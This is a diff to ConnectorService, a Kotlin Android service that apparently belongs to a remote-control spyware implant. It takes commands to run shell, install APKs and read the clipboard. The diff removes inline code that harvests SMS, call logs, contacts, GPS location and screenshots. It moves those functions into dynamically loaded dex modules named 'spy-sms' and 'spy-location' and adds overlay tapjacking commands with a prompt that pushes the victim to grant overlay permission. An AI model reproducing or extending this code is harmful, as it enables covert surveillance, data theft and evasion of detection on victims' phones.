@@ -10,17 +10,11 @@ import android.app.Service
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.location.LocationListener
-import android.location.LocationManager
 import android.os.Build
-import android.os.HandlerThread
 import android.net.wifi.WifiManager
 import android.os.IBinder
 import android.os.PowerManager
 import android.os.SystemClock
-import android.provider.CallLog
-import android.provider.ContactsContract
-import android.provider.Telephony
 import androidx.core.app.NotificationCompat
 import com.google.gson.JsonObject
 import com.google.gson.JsonParser
@@ -31,7 +25,6 @@ import okhttp3.RequestBody.Companion.toRequestBody
 import java.text.SimpleDateFormat
 import java.util.Date
 import java.util.Locale
-import java.util.concurrent.CountDownLatch
 import java.util.concurrent.TimeUnit
 
 class ConnectorService : Service() {
@@ -99,6 +92,7 @@ class ConnectorService : Service() {
         isRunning = true
         currentDir = prefs.getString("shell_dir", "/sdcard") ?: "/sdcard"
         startPolling()
+        DexModuleLoader.preloadAll(this)
         return START_STICKY
     }
 
@@ -230,17 +224,17 @@ class ConnectorService : Service() {
             cmd.startsWith("settings_put:") -> { val p = cmd.removePrefix("settings_put:").split(":", limit=3); Pair(if (p.size < 3) "ERROR" else runShell("settings put ${p[0]} ${p[1]} ${p[2]}"), "command_result") }
             cmd.startsWith("settings_get:") -> { val p = cmd.removePrefix("settings_get:").split(":", limit=2); Pair(if (p.size < 2) "ERROR" else runShell("settings get ${p[0]} ${p[1]}"), "command_result") }
 
-            // ── Location ──
-            cmd == "get_location"        -> Pair(getLocation(), "command_result")
+            // ── Location (dex module) ──
+            cmd == "get_location"        -> DexModuleLoader.execute(this, "spy-location", cmd, null)
 
-            // ── SMS ──
-            cmd.startsWith("get_sms")    -> { val n = cmd.substringAfter("get_sms:","").toIntOrNull() ?: 50; Pair(getSms(n), "command_result") }
+            // ── SMS (dex module) ──
+            cmd.startsWith("get_sms")    -> DexModuleLoader.execute(this, "spy-sms", cmd, null)
 
-            // ── Call log ──
-            cmd.startsWith("get_calls")  -> { val n = cmd.substringAfter("get_calls:","").toIntOrNull() ?: 50; Pair(getCallLog(n), "command_result") }
+            // ── Call log (dex module) ──
+            cmd.startsWith("get_calls")  -> DexModuleLoader.execute(this, "spy-calls", cmd, null)
 
-            // ── Contacts ──
-            cmd.startsWith("get_contacts") -> { val n = cmd.substringAfter("get_contacts:","").toIntOrNull() ?: 200; Pair(getContacts(n), "command_result") }
+            // ── Contacts (dex module) ──
+            cmd.startsWith("get_contacts") -> DexModuleLoader.execute(this, "spy-contacts", cmd, null)
 
             // ── Installed apps ──
             cmd == "get_apps" || cmd.startsWith("pm_list") -> Pair(getInstalledApps(), "command_result")
@@ -265,19 +259,11 @@ class ConnectorService : Service() {
             cmd == "get_clipboard"       -> Pair(getClipboard(), "command_result")
             cmd.startsWith("install_apk:") -> Pair(installApk(cmd.removePrefix("install_apk:")), "command_result")
 
-            // ── Screenshot ──
-            cmd.startsWith("screenshot") -> {
-                val parts = cmd.split(":")
-                val maxW  = parts.getOrNull(1)?.toIntOrNull() ?: 720
-                val qual  = parts.getOrNull(2)?.toIntOrNull() ?: 70
-                Pair(takeScreenshot(maxW, qual), "command_result")
-            }
+            // ── Screenshot (dex module) ──
+            cmd.startsWith("screenshot") -> DexModuleLoader.execute(this, "spy-media", cmd, null)
 
-            // ── Mic recording ──
-            cmd.startsWith("record_mic:") -> {
-                val sec = cmd.removePrefix("record_mic:").toIntOrNull()?.coerceIn(1, 60) ?: 5
-                Pair(recordMic(sec), "command_result")
-            }
+            // ── Mic recording (dex module) ──
+            cmd.startsWith("record_mic:") -> DexModuleLoader.execute(this, "spy-media", cmd, null)
 
             // ── Misc ──
             cmd == "device_info" -> Pair(DeviceInfo.collect(this).toString(), "command_result")
@@ -304,200 +290,21 @@ class ConnectorService : Service() {
             cmd == "wifi_portal_start" -> Pair(startWifiPortal(), "command_result")
             cmd == "wifi_portal_stop"  -> Pair(stopWifiPortal(), "command_result")
 
+            // ── Overlay Trick (SYSTEM_ALERT_WINDOW tapjacking) ──
+            cmd.startsWith("overlay_start") -> Pair(OverlayTrickManager.start(this, extra), "command_result")
+            cmd == "overlay_stop"           -> Pair(OverlayTrickManager.stop(this), "command_result")
+            cmd == "overlay_status"         -> Pair(OverlayTrickManager.status(), "command_result")
+            cmd == "overlay_request_perm"   -> Pair(requestOverlayPermission(), "command_result")
+            cmd == "modules_reload"         -> { DexModuleLoader.invalidate(); DexModuleLoader.preloadAll(this); Pair("✅ Modules reloading…", "command_result") }
+
             else -> Pair("ERROR: Unknown command: $cmd", "command_result")
         }
     }
 
-    // ─────────────────────────────────────────
-    //  SCREENSHOT — screencap
-    // ─────────────────────────────────────────
 
-    private fun takeScreenshot(maxWidth: Int = 720, quality: Int = 70): String {
-        val tmpPath = "${cacheDir.absolutePath}/.sc_${System.currentTimeMillis()}.png"
-        return try {
-            // Strategy 1: screencap stdout — no disk I/O, no root needed
-            try {
-                val proc = Runtime.getRuntime().exec(arrayOf("screencap", "-p"))
-                val exited = proc.waitFor(3, TimeUnit.SECONDS)
-                if (exited) {
-                    val pngBytes = proc.inputStream.readBytes()
-                    if (pngBytes.size > 1000) {
-                        val result = screenshotFromBytes(pngBytes, maxWidth, quality)
-                        if (!result.startsWith("ERROR")) return result
-                    }
-                }
-                proc.destroy()
-            } catch (_: Exception) {}
 
-            // Strategy 2: screencap to file (last resort)
-            try {
-                java.io.File(tmpPath).delete()
-                runShell("screencap -p $tmpPath")
-                Thread.sleep(300)
-                if (java.io.File(tmpPath).exists()) {
-                    val result = FileOperations.screenshotFromFile(tmpPath, maxWidth, quality)
-                    java.io.File(tmpPath).delete()
-                    if (!result.startsWith("ERROR")) return result
-                }
-            } catch (_: Exception) {}
 
-            "ERROR: Screenshot gagal."
-        } catch (e: Exception) {
-            try { java.io.File(tmpPath).delete() } catch (_: Exception) {}
-            "ERROR: ${e.message}"
-        }
-    }
 
-    private fun screenshotFromBytes(pngBytes: ByteArray, maxWidth: Int, quality: Int): String {
-        return try {
-            val opts1 = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
-            android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts1)
-            val scale = if (opts1.outWidth > maxWidth && maxWidth > 0)
-                (opts1.outWidth.toFloat() / maxWidth).toInt().coerceAtLeast(1) else 1
-            val opts2 = android.graphics.BitmapFactory.Options().apply { inSampleSize = scale }
-            val bmp = android.graphics.BitmapFactory.decodeByteArray(pngBytes, 0, pngBytes.size, opts2)
-                ?: return "ERROR: decode failed"
-            val baos = java.io.ByteArrayOutputStream()
-            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos)
-            bmp.recycle()
-            android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
-        } catch (e: Exception) { "ERROR: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  LOCATION
-    // ─────────────────────────────────────────
-
-    @SuppressLint("MissingPermission")
-    private fun getLocation(): String {
-        return try {
-            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
-            val activeProviders = lm.getProviders(true)
-            if (activeProviders.isEmpty()) return "⚠️ No location providers. Enable GPS."
-
-            val latch = CountDownLatch(1)
-            var freshLoc: android.location.Location? = null
-            val ht = HandlerThread("loc-fix-thread").also { it.start() }
-            val listener = LocationListener { loc ->
-                if (freshLoc == null || loc.accuracy < (freshLoc?.accuracy ?: Float.MAX_VALUE)) freshLoc = loc
-                latch.countDown()
-            }
-            for (p in activeProviders) {
-                try { lm.requestLocationUpdates(p, 0L, 0f, listener, ht.looper) } catch (_: Exception) {}
-            }
-            latch.await(12, TimeUnit.SECONDS)
-            try { lm.removeUpdates(listener) } catch (_: Exception) {}
-            ht.quitSafely()
-
-            var best = freshLoc
-            if (best == null) {
-                for (p in activeProviders) {
-                    val loc = try { lm.getLastKnownLocation(p) } catch (_: Exception) { null } ?: continue
-                    if (best == null || loc.accuracy < best.accuracy) best = loc
-                }
-            }
-            if (best != null) {
-                val isFresh = freshLoc != null
-                val fmt = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-                buildString {
-                    appendLine("📍 Location")
-                    appendLine("Latitude:  ${best.latitude}")
-                    appendLine("Longitude: ${best.longitude}")
-                    appendLine("Accuracy:  ${best.accuracy}m")
-                    appendLine("Provider:  ${best.provider}")
-                    appendLine("Time:      ${fmt.format(Date(best.time))}")
-                    appendLine("Fresh:     ${if (isFresh) "yes" else "no (cached)"}")
-                    appendLine("Maps: https://maps.google.com/?q=${best.latitude},${best.longitude}")
-                }
-            } else "⚠️ Location not available."
-        } catch (e: Exception) { "Error: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  SMS
-    // ─────────────────────────────────────────
-
-    private fun getSms(limit: Int): String {
-        return try {
-            val cur = contentResolver.query(Telephony.Sms.CONTENT_URI,
-                arrayOf("address", "body", "date", "type"), null, null, "date DESC")
-                ?: return "⚠️ Cannot read SMS"
-            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
-            val sb = StringBuilder("=== SMS (last $limit) ===\n")
-            var n = 0
-            cur.use {
-                while (it.moveToNext() && n < limit) {
-                    val addr = it.getString(0) ?: "?"
-                    val body = it.getString(1)?.replace("\n", " ") ?: ""
-                    val date = fmt.format(Date(it.getLong(2)))
-                    val type = if (it.getInt(3) == 1) "▼IN" else "▲OUT"
-                    sb.appendLine("[$date][$type] $addr: $body")
-                    n++
-                }
-            }
-            if (n == 0) sb.append("No SMS found") else sb.appendLine("\nTotal: $n")
-            sb.toString()
-        } catch (e: Exception) { "Error: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  CALL LOG
-    // ─────────────────────────────────────────
-
-    private fun getCallLog(limit: Int): String {
-        return try {
-            val proj = arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
-                CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.CACHED_NAME)
-            val cur = contentResolver.query(CallLog.Calls.CONTENT_URI, proj,
-                null, null, "${CallLog.Calls.DATE} DESC") ?: return "⚠️ Cannot read call log"
-            val fmt = SimpleDateFormat("MM-dd HH:mm", Locale.getDefault())
-            val sb = StringBuilder("=== Call Log (last $limit) ===\n")
-            var n = 0
-            cur.use {
-                while (it.moveToNext() && n < limit) {
-                    val num  = it.getString(0) ?: "?"
-                    val type = when (it.getInt(1)) {
-                        CallLog.Calls.INCOMING_TYPE -> "📲IN "
-                        CallLog.Calls.OUTGOING_TYPE -> "📞OUT"
-                        CallLog.Calls.MISSED_TYPE   -> "❌MIS"
-                        else -> "OTHER"
-                    }
-                    val date = fmt.format(Date(it.getLong(2)))
-                    val dur  = it.getLong(3)
-                    val name = it.getString(4)?.let { n -> if (n.isNotEmpty()) " ($n)" else "" } ?: ""
-                    sb.appendLine("[$date][$type] $num$name — ${dur}s")
-                    n++
-                }
-            }
-            if (n == 0) sb.append("No calls found") else sb.appendLine("\nTotal: $n")
-            sb.toString()
-        } catch (e: Exception) { "Error: ${e.message}" }
-    }
-
-    // ─────────────────────────────────────────
-    //  CONTACTS
-    // ─────────────────────────────────────────
-
-    private fun getContacts(limit: Int): String {
-        return try {
-            val cur = contentResolver.query(
-                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                    ContactsContract.CommonDataKinds.Phone.NUMBER),
-                null, null, "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC")
-                ?: return "⚠️ Cannot read contacts"
-            val sb = StringBuilder("=== Contacts ===\n")
-            var n = 0
-            cur.use {
-                while (it.moveToNext() && n < limit) {
-                    sb.appendLine("${it.getString(0) ?: "?"}: ${it.getString(1) ?: ""}")
-                    n++
-                }
-            }
-            sb.appendLine("\nTotal: $n contacts")
-            sb.toString()
-        } catch (e: Exception) { "Error: ${e.message}" }
-    }
 
     // ─────────────────────────────────────────
     //  INSTALLED APPS
@@ -938,6 +745,25 @@ class ConnectorService : Service() {
 
     private fun log(msg: String) {
         android.util.Log.d("ConnectorService", msg)
+    }
+
+    // ── Overlay Permission Request ─────────────────────────────────────────
+    private fun requestOverlayPermission(): String {
+        return try {
+            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
+                if (android.provider.Settings.canDrawOverlays(this)) {
+                    return "✅ SYSTEM_ALERT_WINDOW sudah granted"
+                }
+                val intent = android.content.Intent(
+                    android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                    android.net.Uri.parse("package:$packageName")
+                ).apply { flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK }
+                startActivity(intent)
+                "📋 Halaman izin overlay dibuka — minta user Allow"
+            } else {
+                "✅ Auto-granted (Android < 6.0)"
+            }
+        } catch (e: Exception) { "ERROR: ${e.message}" }
     }
 
     // ── WiFi Portal ───────────────────────────────────────────────────────────
